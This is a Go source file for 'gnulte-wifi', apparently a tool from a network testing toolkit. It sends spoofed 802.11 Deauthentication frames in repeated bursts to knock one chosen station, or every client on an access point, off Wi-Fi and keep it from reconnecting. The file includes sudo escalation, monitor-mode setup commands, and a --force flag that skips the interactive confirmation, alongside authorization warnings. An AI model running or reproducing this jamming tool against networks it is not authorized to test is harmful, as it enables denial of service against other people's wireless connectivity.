// GNULTE — network testing toolkit.
//
// Copyright (C) 2026 Neptune Productions.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful, but
// WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program. If not, see <https://www.gnu.org/licenses/>.

// Command gnulte-wifi tests 802.11 associations with crafted management
// frames. The targeted variant sends a Deauthentication frame with the source
// set to the access point's BSSID and the destination set to one victim
// station: the station believes its router disconnected it and drops the
// association. Repeated bursts keep it off while it tries to rejoin — the
// behaviour of the "kick client" control in enterprise Wi-Fi consoles,
// reproduced for authorized testing. Use only on networks you own or are
// authorized to test.
package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"gnulte-go/internal/airframes"
	"gnulte-go/internal/safety"
	"gnulte-go/internal/settings"
	"gnulte-go/internal/tui"
	"gnulte-go/internal/ux"
)

const version = "12.0"

func main() {
	var (
		ifaceArg = flag.String("i", "", "wireless interface in monitor mode (e.g. wlan0mon)")
		bssidArg = flag.String("a", "", "access point BSSID (router MAC), e.g. 00:0c:41:63:45:6a")
		staArg   = flag.String("s", "", "station MAC to disconnect (ff:ff:ff:ff:ff:ff = every client on the BSSID)")
		reason   = flag.Int("reason", 7, "802.11 deauth reason code (7 = STA leaving BSS)")
		count    = flag.Int("count", 64, "frames sent per burst")
		delay    = flag.Int("delay", 5, "seconds between bursts (repeat kicks a client that reconnects)")
		once     = flag.Bool("once", false, "send a single burst and exit")
		duration = flag.Int("duration", 0, "auto-stop after N seconds (0 = until interrupt)")

		force       = flag.Bool("force", false, "skip interactive confirmations (require explicit flags)")
		noBanner    = flag.Bool("no-banner", false, "skip the banner")
		quiet       = flag.Bool("q", false, "quiet: results only")
		showDocs    = flag.Bool("docs", false, "print the safety documents and exit")
		resetSafe   = flag.Bool("reset-safety", false, "remove the acceptance record and exit")
		showVer     = flag.Bool("version", false, "print version and exit")
		settingsArg = flag.Bool("settings", false, "open the settings editor (saved defaults) and exit")
	)
	flag.StringVar(ifaceArg, "interface", "", "wireless interface in monitor mode (e.g. wlan0mon)")
	flag.StringVar(bssidArg, "ap", "", "access point BSSID (router MAC), e.g. 00:0c:41:63:45:6a")
	flag.StringVar(staArg, "station", "", "station MAC to disconnect (ff:ff:ff:ff:ff:ff = every client on the BSSID)")
	flag.BoolVar(noBanner, "minimal", false, "skip the banner (alias: --no-banner)")
	flag.BoolVar(quiet, "quiet", false, "quiet: results only")
	flag.Usage = usage
	flag.Parse()

	if *showVer {
		fmt.Printf("GNULTE-WIFI v%s (Go)\n", version)
		return
	}
	if *showDocs {
		safety.ShowDocs(safety.AllDocNames())
		return
	}
	if *resetSafe {
		if err := safety.Reset(); err != nil {
			fatal(err)
		}
		return
	}
	explicit := map[string]bool{}
	flag.Visit(func(f *flag.Flag) {
		explicit[f.Name] = true
	})
	prefs, err := settings.Load()
	if err != nil {
		fatal(fmt.Errorf("settings: %v", err))
	}
	if *settingsArg {
		if !ux.TTY() || !tui.StdinTTY() {
			fatal(fmt.Errorf("the settings editor needs a real terminal"))
		}
		updated, err := settings.Edit(prefs)
		if err != nil {
			fatal(err)
		}
		if err := settings.Save(updated); err != nil {
			fatal(fmt.Errorf("settings: %v", err))
		}
		fmt.Printf("settings saved to %s\n", settings.Path())
		return
	}
	if !explicit["count"] && prefs.WifiCount >= 1 {
		*count = prefs.WifiCount
	}
	if !explicit["delay"] && prefs.WifiDelaySec >= 1 {
		*delay = prefs.WifiDelaySec
	}
	if !*noBanner && !*quiet && os.Getenv("GNULTE_AS_ROOT") != "1" {
		banner()
	}
	if err := safety.EnsureAccepted(); err != nil {
		fatal(err)
	}

	// Administrator-privilege handshake, identical to gnulte: the elevated
	// child skips the banner and admin box via GNULTE_AS_ROOT.
	if os.Geteuid() != 0 && os.Getenv("GNULTE_AS_ROOT") != "1" {
		if !stdinIsTTY() {
			fatal(fmt.Errorf("gnulte-wifi needs root — run it from a terminal so it can request administrator access, or invoke it with sudo"))
		}
		adminBox()
		args := append([]string{"-E", os.Args[0]}, os.Args[1:]...)
		cmd := exec.Command("sudo", args...)
		cmd.Env = append(os.Environ(), "GNULTE_AS_ROOT=1")
		cmd.Stdin = os.Stdin
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			if ee, ok := err.(*exec.ExitError); ok {
				os.Exit(ee.ExitCode())
			}
			fatal(fmt.Errorf("failed to obtain administrator access: %w", err))
		}
		os.Exit(0)
	}
	if os.Getenv("GNULTE_AS_ROOT") == "1" {
		fmt.Println("  " + okText("Sudo access granted — running with administrator privileges."))
		fmt.Println()
	}

	if *ifaceArg == "" {
		fatal(fmt.Errorf("an interface is required (-i) — a wireless adapter in monitor mode, e.g. wlan0mon"))
	}
	if *bssidArg == "" {
		fatal(fmt.Errorf("the access point BSSID is required (-a)"))
	}
	if *staArg == "" {
		fatal(fmt.Errorf("the station MAC to disconnect is required (-s)"))
	}
	bssid, err := airframes.ParseMAC(*bssidArg)
	if err != nil {
		fatal(fmt.Errorf("-a: %v", err))
	}
	station, err := airframes.ParseMAC(*staArg)
	if err != nil {
		fatal(fmt.Errorf("-s: %v", err))
	}
	if *reason < 0 || *reason > 65535 {
		fatal(fmt.Errorf("reason code must be 0-65535 (got %d)", *reason))
	}
	if *count < 1 {
		*count = 1
	}
	if *delay < 1 {
		*delay = 1
	}

	// Interface sanity before any frame is sent: must exist and be in monitor
	// mode, otherwise the injector (or the network) is wrong.
	if !airframes.InterfaceExists(*ifaceArg) {
		fatal(fmt.Errorf("interface %s does not exist", *ifaceArg))
	}
	switch airframes.MonitorMode(*ifaceArg) {
	case "not-monitor":
		fatal(fmt.Errorf("interface %s is not in monitor mode.\n"+
			"  Put the adapter into monitor mode first, for example:\n"+
			"    sudo airmon-ng start %s     (usually produces wlan0mon)\n"+
			"    sudo iw dev %s set type monitor\n  then run with -i <that interface>", *ifaceArg, *ifaceArg, *ifaceArg))
	case "":
		fmt.Println("  " + warnText("could not confirm monitor mode; if injection fails, verify the adapter is in monitor mode"))
	}

	if !*quiet {
		summary(bssid, station, *ifaceArg, *count, *delay, *once, *duration, *reason)
	}
	if !*force {
		if !stdinIsTTY() {
			fatal(fmt.Errorf("this test needs interactive confirmation — run gnulte-wifi from a terminal, or pass --force with explicit flags"))
		}
		if !confirm() {
			fmt.Println("Aborted — nothing was started.")
			return
		}
	}

	// Interrupt handling: a single Ctrl+C stops the burst loop cleanly.
	sigCtx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	var cancel context.CancelFunc
	if *duration > 0 {
		sigCtx, cancel = context.WithTimeout(sigCtx, time.Duration(*duration)*time.Second)
		defer cancel()
	}

	inj, err := airframes.NewInjector(*ifaceArg)
	if err != nil {
		fatal(err)
	}
	defer inj.Close()

	if !*quiet {
		fmt.Println("  " + okText("Injecting deauth frames — "+stationLabel(station)))
		fmt.Println("  " + ux.C(ux.Dim, "  Ctrl+C stops the test; the station reconnects on its own."))
		fmt.Println()
	}

	var seq uint16
	var sent, bursts uint64
loop:
	for {
		select {
		case <-sigCtx.Done():
			break loop
		default:
		}
		for i := 0; i < *count; i++ {
			f := airframes.DeauthFrame(bssid, station, uint16(*reason), seq)
			seq = (seq + 1) & 0x0fff
			if err := inj.Send(f); err != nil {
				fatal(fmt.Errorf("frame %d: %v", sent+1, err))
			}
			sent++
		}
		bursts++
		if !*quiet {
			fmt.Printf("  %s burst #%-3d  %5d frames → %-17s %s\n",
				ux.C(ux.Cyan, ">>"), bursts, *count, station, ux.C(ux.Dim, stationLabelExtra(station)))
		}
		if *once {
			break loop
		}
		select {
		case <-sigCtx.Done():
			break loop
		case <-time.After(time.Duration(*delay) * time.Second):
		}
	}

	if !*quiet {
		fmt.Println()
	}
	fmt.Printf("  %s sent %d deauth frame(s) in %d burst(s) → %s\n",
		okText(""), sent, bursts, station)
	fmt.Println("\nTest finished — connectivity is normal; the station associates again on its own.")
}

func stationLabel(s airframes.MAC) string {
	if s.IsBroadcast() {
		return "broadcast — every client on the BSSID"
	}
	return "single station " + s.String()
}

// Extra annotation shown beside the per-burst counter line.
func stationLabelExtra(s airframes.MAC) string {
	if s.IsBroadcast() {
		return "(all clients)"
	}
	return ""
}

// summary prints the pre-test confirmation box (mirrors gnulte's CONFIRM TEST).
func summary(bssid, station airframes.MAC, iface string, count, delay int, once bool, duration, reason int) {
	repeat := fmt.Sprintf("every %d s until interrupted", delay)
	if once {
		repeat = "single burst"
	} else if duration > 0 {
		repeat = fmt.Sprintf("every %d s for %d s", delay, duration)
	}
	fmt.Println("══════════════════════════════════════════════════")
	fmt.Println("                CONFIRM DEAUTH TEST")
	fmt.Println("══════════════════════════════════════════════════")
	fmt.Printf("  Access point : %s\n", ux.C(ux.Target, bssid.String()))
	fmt.Printf("  Station      : %s\n", ux.C(ux.Target, stationLabel(station)))
	fmt.Printf("  Interface    : %s (monitor mode)\n", ux.C(ux.Cyan, iface))
	fmt.Printf("  Deauth reason: %d\n", reason)
	fmt.Printf("  Frames/burst : %d\n", count)
	fmt.Printf("  Repeat       : %s\n", repeat)
	fmt.Println("  Warning      : this disconnects the station from its router")
	fmt.Println("                 and stops its Wi-Fi until it reconnects.")
	fmt.Println("  Use only where you are authorized and the activity is lawful.")
	fmt.Println("══════════════════════════════════════════════════")
	fmt.Println()
}

func confirm() bool {
	fmt.Print("Disconnect this station from Wi-Fi? (y/N): ")
	var a string
	_, _ = fmt.Scanln(&a)
	if a == "" {
		return false
	}
	l := toLower(a)
	return l == "y" || l == "yes"
}

func toLower(s string) string {
	b := []byte(s)
	for i := range b {
		if b[i] >= 'A' && b[i] <= 'Z' {
			b[i] += 'a' - 'A'
		}
	}
	return string(b)
}

func banner() {
	line := strings.Repeat("═", 52)
	fmt.Println("  " + line)
	fmt.Println("  " + ux.C(ux.Header, "GNULTE WIFI") + "   " + ux.C(ux.Cyan, "v"+version) + "   " + ux.C(ux.Dim, "802.11 testing"))
	fmt.Println("  " + ux.C(ux.Dim, "authorized network testing only"))
	fmt.Println("  " + line)
	fmt.Println()
}

func okText(s string) string {
	return ux.C(ux.Green+ux.Bold, "[✓]") + " " + s
}

func warnText(s string) string {
	return ux.C(ux.Yellow+ux.Bold, "[!]") + " " + s
}

func stdinIsTTY() bool {
	fi, err := os.Stdin.Stat()
	return err == nil && fi.Mode()&os.ModeCharDevice != 0
}

func adminBox() {
	fmt.Println()
	fmt.Println(ux.C(ux.Yellow, "═══════════════════════════════════════════════════════════════════"))
	fmt.Println(ux.C(ux.Yellow+ux.Bold, "          ADMINISTRATOR PRIVILEGES REQUIRED"))
	fmt.Println(ux.C(ux.Yellow, "═══════════════════════════════════════════════════════════════════"))
	fmt.Println()
	fmt.Println("gnulte-wifi needs sudo (root) access to inject raw 802.11 frames:")
	fmt.Println()
	fmt.Println("  • raw sockets – sending Deauthentication frames on the")
	fmt.Println("                  monitor-mode wireless interface")
	fmt.Println()
	fmt.Println("Without root, frame injection cannot function. gnulte-wifi will")
	fmt.Println("now request your password and run the test with the privileges it needs.")
	fmt.Println()
	fmt.Println(ux.C(ux.Yellow, "═══════════════════════════════════════════════════════════════════"))
	fmt.Println()
}

func fatal(err error) {
	fmt.Fprintf(os.Stderr, "gnulte-wifi: %v\n", err)
	os.Exit(1)
}

func usage() {
	fmt.Fprintf(os.Stderr, `GNULTE-WIFI v%s (Go) — authorized network testing only

Targeted station disconnection:
  An 802.11 Deauthentication frame is crafted with the source MAC set to the
  access point's BSSID and the destination set to one victim station. The
  station assumes its router disconnected it and drops the Wi-Fi association.
  Repeated bursts keep kicking a client that rejoins — the behaviour of a
  router's "kick client" control, reproduced for authorized testing.

Usage:
  gnulte-wifi -i IFACE -a APBSSID -s STATIONMAC
      (prompts for sudo on first launch; run with sudo to skip)

  sudo gnulte-wifi -i wlan0mon -a 00:0c:41:63:45:6a -s aa:bb:cc:dd:ee:ff

Options:
  -i, --interface IFACE   wireless interface in monitor mode (e.g. wlan0mon)
  -a, --ap MAC            access point BSSID (the router's MAC)
  -s, --station MAC       station to disconnect; ff:ff:ff:ff:ff:ff = all clients
      --reason CODE       deauth reason code (default 7 = STA leaving BSS)
      --count N           frames per burst (default 64)
      --delay SECONDS     seconds between bursts (default 5)
      --once              send a single burst and exit
      --duration SECONDS  auto-stop after N seconds (0 = until Ctrl+C)
      --force             skip interactive confirmations
      --no-banner         skip the banner (alias: --minimal)
  -q, --quiet             results only
      --settings          open the settings editor (saved defaults) and exit
      --docs              print the safety documents and exit
      --reset-safety      remove the acceptance record and exit
      --version           print version and exit
  -h, --help              show this help

The interface must already be in monitor mode (airmon-ng start / iw dev set
type monitor). Some adapters cap injection rates; raise --count if a single
frame rarely lands.
`, version)
}
